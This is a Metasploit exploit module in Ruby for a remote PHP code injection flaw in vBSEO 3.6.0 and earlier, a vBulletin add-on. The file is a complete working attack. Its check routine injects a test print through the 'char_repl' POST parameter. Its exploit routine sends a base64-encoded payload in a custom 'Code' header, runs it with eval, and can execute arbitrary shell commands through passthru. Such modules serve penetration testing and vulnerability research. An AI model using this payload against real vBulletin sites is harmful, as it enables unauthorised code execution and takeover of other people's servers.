require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
    include Msf::Exploit::Remote::HttpClient
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'vBSEO <= 3.6.0 "proc_deutf()" Remote PHP Code Injection',
            'Description'    => %q{
                    This module exploits a vulnerability in the 'proc_deutf()' function
                defined in /includes/functions_vbseocp_abstract.php. User input passed through
                'char_repl' POST parameter isn't properly sanitized before being used in a call
                to preg_replace() function which uses the 'e' modifier. This can be exploited to
                inject and execute arbitrary code leveraging the PHP's complex curly syntax.
            },
            'Author'         => 'EgiX <n0b0d13s[at]gmail.com>', # originally reported by the vendor
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision$',
            'References'     =>
                [
                    ['BID', '51647'],
                    ['URL', 'http://www.vbseo.com/f5/vbseo-security-bulletin-all-supported-versions-patch-release-52783/'],
                ],
            'Privileged'     => false,
            'Payload'        =>
                {
                    'DisableNops' => true,
                    'Space'       => 8190,
                    'Keys'        => ['php'],
                },
            'Platform'       => ['php'],
            'Arch'           => ARCH_PHP,
            'Targets'        => [[ 'Automatic', { }]],
            'DisclosureDate' => 'Jan 23 2012',
            'DefaultTarget'  => 0))
            register_options(
                [
                    OptString.new('URI', [true, "The full URI path to vBulletin", "/vb/"]),
                ], self.class)
    end
    def check
        flag = rand_text_alpha(rand(10)+10)
        data = "char_repl='{${print(#{flag})}}'=>"
        uri = ''
        uri << datastore['URI']
        uri << '/' if uri[-1,1] != '/'
        uri << 'vbseocp.php'
        response = send_request_cgi({
            'method' => "POST",
            'uri' => uri,
            'data' => "#{data}"
        })
        if response.code == 200 and response.body =~ /#{flag}/
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
    def exploit
        if datastore['CMD']
            p = "passthru(\"%s\");" % datastore['CMD']
            p = Rex::Text.encode_base64(p)
        else
            p = Rex::Text.encode_base64(payload.encoded)
        end
        data = "char_repl='{${eval(base64_decode($_SERVER[HTTP_CODE]))}}.{${die()}}'=>"
        uri = ''
        uri << datastore['URI']
        uri << '/' if uri[-1,1] != '/'
        uri << 'vbseocp.php'
        response = send_request_cgi({
            'method' => 'POST',
            'uri' => uri,
            'data' => data,
            'headers' => { 'Code' => p }
        })
        print_status("%s" % response.body) if datastore['CMD']
    end
end
